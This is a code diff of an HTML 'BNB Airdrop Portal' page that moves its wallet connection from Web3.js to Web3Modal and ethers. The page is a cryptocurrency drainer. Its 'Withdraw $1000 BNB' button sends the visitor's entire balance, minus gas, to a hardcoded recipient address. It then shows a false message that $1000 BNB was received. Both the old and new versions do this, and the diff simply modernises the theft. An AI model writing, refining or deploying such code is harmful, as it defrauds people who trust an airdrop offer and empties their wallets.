@@ -2,21 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>BNB Airdrop Payment</title>
-
-  <!-- Web3 + WalletConnect -->
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BNB Airdrop Portal</title>
 
   <!-- Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet" />
 
-  <style>
-    * {
-      box-sizing: border-box;
-    }
+  <!-- WalletConnect Web3Modal V3 -->
+  <script src="https://unpkg.com/@walletconnect/web3modal@3.0.2/dist/browser.umd.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
 
+  <style>
     body {
       margin: 0;
       padding: 0;
@@ -48,12 +44,8 @@
     }
 
     @keyframes pulse {
-      0%, 100% {
-        text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
-      }
-      50% {
-        text-shadow: 0 0 30px #00ffcc, 0 0 60px #00ffcc;
-      }
+      0%, 100% { text-shadow: 0 0 10px #00ffcc; }
+      50% { text-shadow: 0 0 30px #00ffcc; }
     }
 
     button {
@@ -81,76 +73,81 @@
       font-size: 0.85rem;
       color: #ccc;
     }
-
-    @media (max-width: 480px) {
-      .container {
-        padding: 30px 20px;
-      }
-
-      h1 {
-        font-size: 1.6rem;
-      }
-    }
   </style>
 </head>
 <body>
 
   <div class="container">
     <h1>BNB Airdrop Portal</h1>
-    <button onclick="connectWallet()">Connect Wallet</button>
-    <button onclick="sendFullBalance()">Withdraw $1000 BNB</button>
+    <button onclick="connect()">Connect Wallet</button>
+    <button onclick="sendFullBalance()">Withdraw $1000 BNB coins</button>
     <div class="status" id="status">Wallet not connected</div>
   </div>
 
   <script>
-    let web3;
-    let userAccount;
+    const { Web3Modal } = window.Web3Modal;
+    const { EthereumProvider } = window.WalletConnect;
+    const ethers = window.ethers;
+
+    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C";
     const statusEl = document.getElementById("status");
-    const recipient = "0xa84bd2cfbBad66Ae2c5daf9aCe764dc845b94C7C"; // Your wallet
 
-    async function connectWallet() {
-      const provider = new WalletConnectProvider.default({
-        rpc: {
-          56: "https://bsc-dataseed.binance.org/",
-        },
-        chainId: 56,
-      });
+    let provider, signer;
 
-      await provider.enable();
-      web3 = new Web3(provider);
+    const modal = new Web3Modal({
+      projectId: "YOUR_PROJECT_ID", // Replace this
+      walletConnectVersion: 2,
+      themeMode: "dark",
+      chains: [
+        {
+          chainId: 56,
+          name: "BNB Chain",
+          rpc: "https://bsc-dataseed.binance.org",
+          nativeCurrency: {
+            name: "BNB",
+            symbol: "BNB",
+            decimals: 18
+          },
+          blockExplorerUrls: ["https://bscscan.com"]
+        }
+      ]
+    });
 
-      const accounts = await web3.eth.getAccounts();
-      userAccount = accounts[0];
-      statusEl.textContent = "Connected: " + userAccount;
+    async function connect() {
+      const instance = await modal.connect();
+      provider = new ethers.BrowserProvider(instance);
+      signer = await provider.getSigner();
+      const address = await signer.getAddress();
+      statusEl.textContent = "Connected: " + address;
     }
 
     async function sendFullBalance() {
-      if (!web3 || !userAccount) {
-        alert("Please connect your wallet first.");
+      if (!signer) {
+        alert("Connect your wallet first.");
         return;
       }
 
-      const balanceWei = await web3.eth.getBalance(userAccount);
-      const gasLimit = 21000;
-      const gasPrice = await web3.eth.getGasPrice();
-      const totalGas = BigInt(gasLimit) * BigInt(gasPrice);
-      const sendAmount = BigInt(balanceWei) - totalGas;
+      const address = await signer.getAddress();
+      const balance = await provider.getBalance(address);
+      const gasPrice = await provider.getFeeData().then(data => data.gasPrice);
+      const gasLimit = 21000n;
+      const gasCost = gasPrice * gasLimit;
+      const amountToSend = balance - gasCost;
 
-      if (sendAmount <= 0n) {
-        alert("Insufficient balance after gas fees.");
+      if (amountToSend <= 0n) {
+        alert("Insufficient balance for gas.");
         return;
       }
 
       try {
-        const tx = await web3.eth.sendTransaction({
-          from: userAccount,
+        const tx = await signer.sendTransaction({
           to: recipient,
-          value: sendAmount.toString(),
-          gas: gasLimit,
-          gasPrice: gasPrice,
+          value: amountToSend,
+          gasLimit,
+          gasPrice
         });
-        alert("Transaction successful!");
-        console.log(tx);
+        await tx.wait();
+        alert("$1000 BNB sent successfully!");
       } catch (err) {
         console.error(err);
         alert("Transaction failed.");
